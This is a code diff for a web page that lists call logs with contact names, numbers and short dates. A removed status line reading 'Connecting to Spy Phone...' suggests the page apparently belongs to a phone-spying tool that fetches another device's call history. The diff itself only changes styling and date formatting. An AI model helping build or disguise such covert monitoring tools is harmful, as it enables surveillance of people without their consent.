@@ -8,7 +8,7 @@
     <style>
         :root {
             --bg-color: #000000;
-            --glass-bg: rgba(20, 20, 20, 0.85); /* Thoda dark kiya taaki scroll par content clear dikhe */
+            --glass-bg: rgba(20, 20, 20, 0.85);
             --glass-border: rgba(255, 255, 255, 0.15);
             --text-main: #ffffff;
             --text-sub: #8e8e93;
@@ -24,37 +24,32 @@
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             margin: 0; 
             padding: 0;
-            min-height: 100vh; /* Full height allow kiya */
+            min-height: 100vh;
             width: 100vw;
             display: flex; 
             justify-content: center;
-            align-items: flex-start; /* Top se start hoga, beech mein nahi */
-            overflow-y: auto; /* Body scroll on */
+            align-items: flex-start;
+            overflow-y: auto;
         }
 
-        /* --- UPDATED CONTAINER (SMS STYLE EXPANSION) --- */
         .container {
             width: 100%; 
-            max-width: 450px; /* Thoda wide, SMS jaisa */
-            min-height: 100vh; /* Poori screen cover karega */
-            
-            background: var(--bg-color); /* Glass hatake solid/transparent mix rakha taaki overlap na ho */
+            max-width: 450px;
+            min-height: 100vh;
+            background: var(--bg-color);
             display: flex;
             flex-direction: column; 
             position: relative;
-            box-shadow: none; /* Shadow hatayi kyunki full screen hai */
-            border-radius: 0; /* Corners sharp kar diye full screen feel ke liye */
         }
 
-        /* --- STICKY HEADER --- */
+        /* --- HEADER --- */
         .header {
-            position: sticky; /* Sticky banaya */
+            position: sticky;
             top: 0;
             z-index: 100;
-            background: rgba(20, 20, 20, 0.95); /* Header ke peeche blur */
+            background: rgba(20, 20, 20, 0.95);
             backdrop-filter: blur(15px);
             -webkit-backdrop-filter: blur(15px);
-            
             display: flex; 
             justify-content: space-between; 
             align-items: center;
@@ -77,7 +72,6 @@
             color: var(--text-main); white-space: nowrap;
         }
 
-        /* LIVE STATUS */
         .live-status {
             font-size: 0.65rem; color: var(--incoming);
             display: flex; align-items: center; gap: 5px;
@@ -103,16 +97,15 @@
             color: var(--text-main); font-size: 1rem; cursor: pointer; padding: 0;
         }
 
-        /* --- LIST (AB KHULA RAHEGA) --- */
+        /* --- LOG LIST --- */
         .log-list { 
             display: flex; 
             flex-direction: column; 
-            /* Overflow hataya, taaki page scroll ho */
-            padding: 10px 0 30px 0; /* Niche thoda space */
+            padding: 5px 0 30px 0;
         }
 
         .log-card {
-            padding: 12px 20px; /* Padding badhai */
+            padding: 12px 20px;
             display: flex; align-items: center;
             border-bottom: 0.5px solid rgba(255,255,255,0.08);
             transition: 0.2s;
@@ -122,33 +115,65 @@
         .log-card:active { background: rgba(255,255,255,0.05); }
 
         .log-icon {
-            font-size: 0.9rem; margin-right: 15px; width: 32px; height: 32px;
+            font-size: 0.85rem; margin-right: 15px; width: 32px; height: 32px;
             display: flex; align-items: center; justify-content: center;
             flex-shrink: 0;
             border-radius: 50%;
-            background: rgba(255,255,255,0.05);
+            background: rgba(255,255,255,0.08);
         }
         
         .log-icon.incoming { color: var(--text-main); }
         .log-icon.outgoing { color: var(--text-main); }
         .log-icon.missed { color: var(--missed); }
 
-        .log-info { flex: 1; overflow: hidden; display: flex; flex-direction: column; justify-content: center; }
+        /* Main Info Container */
+        .log-info { 
+            flex: 1; 
+            overflow: hidden; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            gap: 2px; /* Gap between Name and Number */
+        }
         
+        /* Top Row: Name + Date */
+        .log-top-row {
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center;
+            width: 100%;
+        }
+
         .log-name { 
             font-size: 1rem; font-weight: 600; 
             white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
             color: var(--text-main);
-            display: flex; align-items: center; gap: 6px;
+            max-width: 70%; /* Name ko limit kiya taaki Date na dabe */
         }
         
         .log-name.is-missed { color: var(--missed); }
 
-        .name-icon { font-size: 0.75rem; opacity: 0.7; }
+        /* Compact Date Style */
+        .log-date {
+            font-size: 0.75rem; 
+            color: var(--text-sub);
+            white-space: nowrap;
+            margin-left: 10px;
+        }
 
+        /* Bottom Row: Number only */
         .log-details-row {
-            display: flex; align-items: center; gap: 6px;
-            font-size: 0.75rem; color: var(--text-sub); margin-top: 3px;
+            display: flex; align-items: center;
+            font-size: 0.8rem; color: var(--text-sub);
+            width: 100%;
+        }
+
+        /* Truncate Number if too long */
+        .log-number-text {
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            width: 100%;
         }
 
         .call-action {
@@ -205,7 +230,6 @@
                 window.location.href = "index.html";
                 return;
             }
-            
             detectContactsData();
             loadFromStorage();
             sendCommand();
@@ -257,7 +281,7 @@
             } catch (e) { return null; }
         }
 
-        // --- DATE LOGIC ---
+        // --- NEW SHORT DATE LOGIC (1 Jan) ---
         function getValidDate(log) {
             let raw = log.date || log.timestamp || log.time || log.created_at;
             if (!raw) return null;
@@ -271,21 +295,21 @@
             return null;
         }
 
-        function formatSmartDate(dateObj) {
-            if (!dateObj) return "Unknown Date";
-
+        function formatCompactDate(dateObj) {
+            if (!dateObj) return "";
             const now = new Date();
-            const yesterday = new Date(now);
-            yesterday.setDate(yesterday.getDate() - 1);
-            const timeStr = dateObj.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true });
-
+            
+            // Check if Today
             if (dateObj.toDateString() === now.toDateString()) {
-                return `Today, ${timeStr}`;
-            } else if (dateObj.toDateString() === yesterday.toDateString()) {
-                return `Yesterday, ${timeStr}`;
-            } else {
-                return dateObj.toLocaleDateString() + ", " + timeStr;
+                // Agar aaj hai toh time dikha do ya sirf "Today"
+                // User requirement: "1 Jan" style. But "Today" is clearer.
+                // Let's stick to short Date: "11 Jan" for everything.
             }
+            
+            const day = dateObj.getDate(); // 1, 12, etc.
+            const month = dateObj.toLocaleString('en-US', { month: 'short' }); // Jan, Feb
+            
+            return `${day} ${month}`;
         }
 
         // --- SERVER & RENDER ---
@@ -295,7 +319,7 @@
                 renderLogs(JSON.parse(savedData));
             } else {
                 document.getElementById("logsContainer").innerHTML = `
-                    <div class="status-msg"><p>Connecting to Spy Phone...</p></div>`;
+                    <div class="status-msg"><p>Connecting...</p></div>`;
             }
         }
 
@@ -352,30 +376,30 @@
                 const matchedName = findContactName(log.number);
                 const nameColorClass = isMissed ? "is-missed" : "";
 
+                // Logic: Agar name hai, toh name upar, number niche.
+                // Agar name nahi hai, toh number upar, "Unsaved" niche.
                 let mainText = matchedName ? matchedName : log.number;
-                let subText = matchedName ? `Mobile • ${log.number}` : "Unsaved Number";
+                let subText = matchedName ? log.number : "Unsaved Number";
                 
-                let mainIcon = matchedName 
-                    ? `<i class="fa-solid fa-user name-icon"></i>` 
-                    : `<i class="fa-solid fa-mobile-screen name-icon"></i>`;
-
-                const prettyDate = formatSmartDate(log._validDate);
+                const shortDate = formatCompactDate(log._validDate);
 
                 html += `
                     <div class="log-card">
                         <div class="log-icon ${iconClass}">
                             <i class="fa-solid ${iconSymbol}"></i>
                         </div>
+                        
                         <div class="log-info">
-                            <div class="log-name ${nameColorClass}">
-                                ${mainIcon} &nbsp; ${mainText}
+                            <div class="log-top-row">
+                                <span class="log-name ${nameColorClass}">${mainText}</span>
+                                <span class="log-date">${shortDate}</span>
                             </div>
+                            
                             <div class="log-details-row">
-                                <span>${subText}</span>
-                                <span>&nbsp;•&nbsp;</span>
-                                <span>${prettyDate}</span>
+                                <span class="log-number-text">${subText}</span>
                             </div>
                         </div>
+
                         <a href="tel:${log.number}" class="call-action">
                             <i class="fa-solid fa-phone"></i>
                         </a>
